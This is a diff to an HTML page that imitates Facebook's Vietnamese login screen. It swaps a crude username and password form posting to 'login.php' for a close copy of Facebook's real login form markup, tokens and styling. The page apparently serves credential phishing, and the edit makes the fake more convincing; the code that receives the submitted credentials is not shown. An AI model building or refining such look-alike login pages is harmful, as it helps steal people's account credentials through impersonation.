@@ -19,18 +19,8 @@
 			<div class="m-header">
 				<h3>Facebook</h3>
 			</div>
-			<center> <div class="login-form">  
-				<form action="login.php"> method="post"
-					<label for="username">Username:</label>
-					<input name="username" type="text" id="username"></input><br /><br />
-					<label for="password">Password:</label>
-					<input name="password" id="password" type="password"></input><br />
-					<input type="submit" name="submit" value="Đăng Nhập" style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff; margin: 4px 0 0 80px; padding: 2px 6px;"></input>
-                                        <div class="_6ltj"><a href="https://www.facebook.com/recover/initiate/?ars=facebook_login">Quên mật khẩu?</a></div>
-				</form>
-
-		</div>
-</div>
+			<form class="_featuredLogin__formContainer" data-testid="royal_login_form" action="/login/" method="post" onsubmit="" id="u_0_a"><input type="hidden" name="jazoest" value="2700" autocomplete="off" /><input type="hidden" name="lsd" value="AVqew44p" autocomplete="off" /><div><div class="_6lux"><input type="text" class="inputtext _55r1 _6luy" name="email" id="email" data-testid="royal_email" placeholder="Email ho&#x1eb7;c s&#x1ed1; &#x111;i&#x1ec7;n tho&#x1ea1;i" autofocus="1" aria-label="Email ho&#x1eb7;c s&#x1ed1; &#x111;i&#x1ec7;n tho&#x1ea1;i" /></div><div class="_6lux"><input type="password" class="inputtext _55r1 _6luy" name="pass" id="pass" data-testid="royal_pass" placeholder="M&#x1ead;t kh&#x1ea9;u" aria-label="M&#x1ead;t kh&#x1ea9;u" /></div></div><input type="hidden" autocomplete="off" name="login_source" value="comet_headerless_login" /><div class="_6ltg">
+			<button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="u_0_b">Đăng nhập</button></div>
 		<footer>
 			<ul>
 				<li><a href="">Mobile</a></li>
